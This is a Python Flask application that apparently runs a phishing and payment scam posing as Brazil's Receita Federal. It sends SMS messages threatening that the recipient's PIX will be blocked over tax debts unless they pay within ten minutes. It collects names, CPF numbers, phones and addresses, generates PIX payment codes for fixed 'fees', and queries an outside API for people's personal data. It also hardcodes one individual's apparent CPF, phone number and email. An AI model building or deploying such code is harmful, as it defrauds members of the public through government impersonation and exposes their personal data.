import os
from flask import Flask, render_template, request, jsonify, redirect, url_for
import logging
import secrets
import qrcode
import base64
from io import BytesIO
import re
import random
import string
import requests
import json

app = Flask(__name__)

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    try:
        # Get SMS API key from environment variables
        sms_api_key = os.environ.get('SMS_API_KEY')
        if not sms_api_key:
            app.logger.error("SMS_API_KEY not found in environment variables")
            return False

        # Get first name
        first_name = full_name.split()[0]

        # Format phone number (remove any non-digits and ensure it's in the correct format)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Message template
            message = f"[RECEITA FEDERAL] {first_name}, SEU PIX SERA BLOQUEADO por dividas fiscais. Estamos aguardando o pagamento no valor de R${amount:.2f}. Prazo acaba em 10min."

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            app.logger.info(f"SMS sent to {formatted_phone}. Response: {response.text}")
            return response.status_code == 200

        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False

    except Exception as e:
        app.logger.error(f"Error sending SMS: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

@app.route('/')
def index():
    try:
        # Get data from query parameters for backward compatibility
        customer_data = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', '')
        }

        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
        return render_template('index.html', customer=customer_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/payment')
def payment():
    try:
        from for4payments import create_payment_api

        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')
        
        # Obter dados de endereço
        rua = request.args.get('rua', '')
        numero = request.args.get('numero', '')
        complemento = request.args.get('complemento', '')
        bairro = request.args.get('bairro', '')
        cidade = request.args.get('cidade', '')
        estado = request.args.get('estado', '')
        cep = request.args.get('cep', '')
        
        # Criar objeto de endereço para passar ao template
        endereco = {
            'rua': rua,
            'numero': numero,
            'complemento': complemento,
            'bairro': bairro,
            'cidade': cidade,
            'estado': estado,
            'cep': cep
        }
        
        app.logger.info(f"[PROD] Endereço do cliente: {endereco}")

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")

        # Inicializa a API For4Payments
        api = create_payment_api()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        # Utilize a função re.sub para remover caracteres não numéricos
        customer_phone = re.sub(r'\D', '', phone) if phone else generate_random_phone()

        # Valor fixo de R$ 54,46 conforme solicitado
        amount = 54.46

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': customer_phone,
            'amount': amount
        }

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        return render_template('payment.html', 
                         qr_code=pix_data['pixQrCode'], 
                         pix_code=pix_data['pixCode'], 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         endereco=endereco,
                         transaction_id=pix_data['id'],
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/payment-update')
def payment_update():
    try:
        from for4payments import create_payment_api

        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}")

        # Inicializa a API For4Payments
        api = create_payment_api()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Gera um telefone aleatório sem o prefixo 55
        phone = generate_random_phone()

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': phone,
            'amount': 74.90  # Valor fixo para atualização cadastral
        }

        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        return render_template('payment_update.html', 
                         qr_code=pix_data['pixQrCode'], 
                         pix_code=pix_data['pixCode'], 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         transaction_id=pix_data['id'],
                         amount=74.90)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    try:
        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
        return render_template('buscar-cpf.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/api/consulta-cpf', methods=['GET'])
def consulta_cpf():
    cpf = request.args.get('cpf', '')
    if not cpf:
        return jsonify({"sucesso": False, "mensagem": "CPF não fornecido"})
    
    # Remover pontuação do CPF
    cpf_limpo = ''.join(filter(str.isdigit, cpf))
    
    # Verificar se é o CPF especial para simulação
    if cpf_limpo == "71054019401":
        app.logger.info(f"[PROD] Usando dados simulados para o CPF: {cpf_limpo}")
        return jsonify({
            "sucesso": True,
            "cliente": {
                "id": 46729,
                "nome": "Daiana vieira da Silva",
                "cpf": cpf_limpo,
                "telefone": "+5582991849344",
                "email": "anthonygabriel6005@gmail.com",
                "pixCode": "00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/2f2ea297-3c94-4ac3-a146-c0724d2a3f6a5204000053039865802BR5925PAGAMENTO SEGURO INTERMED6006SOBRAL62070503***630427E6"
            }
        })
    
    try:
        # Fazer a requisição para a API externa
        url = f"https://webhook-manager.replit.app/api/v1/cliente?cpf={cpf_limpo}"
        app.logger.info(f"[PROD] Consultando API externa: {url}")
        
        response = requests.get(url, timeout=10)
        app.logger.info(f"[PROD] Resposta da API: {response.status_code}")
        
        if response.status_code != 200:
            app.logger.error(f"[PROD] API retornou código de erro: {response.status_code}")
            return jsonify({"sucesso": False, "mensagem": f"Erro na consulta: HTTP {response.status_code}"})
        
        # Retornar a resposta da API
        return jsonify(response.json())
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao consultar API: {str(e)}")
        return jsonify({"sucesso": False, "mensagem": f"Erro ao consultar a API: {str(e)}"})

@app.route('/check-payment-status/<transaction_id>')
def check_payment_status(transaction_id):
    try:
        from for4payments import create_payment_api
        api = create_payment_api()

        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")

        return jsonify(status_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/obrigado')
def thank_you():
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', '')
        }

        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/atualizar-cadastro', methods=['POST'])
def atualizar_cadastro():
    try:
        app.logger.info("[PROD] Recebendo atualização cadastral")
        # Log form data for debugging
        app.logger.debug(f"Form data: {request.form}")

        # Extract form data
        data = {
            'birth_date': request.form.get('birth_date'),
            'cep': request.form.get('cep'),
            'employed': request.form.get('employed'),
            'salary': request.form.get('salary'),
            'household_members': request.form.get('household_members')
        }

        app.logger.info(f"[PROD] Dados recebidos: {data}")

        # Aqui você pode adicionar a lógica para processar os dados
        # Por enquanto, vamos apenas redirecionar para a página de pagamento
        nome = request.form.get('nome', '')
        cpf = request.form.get('cpf', '')

        return redirect(url_for('payment_update', nome=nome, cpf=cpf))

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)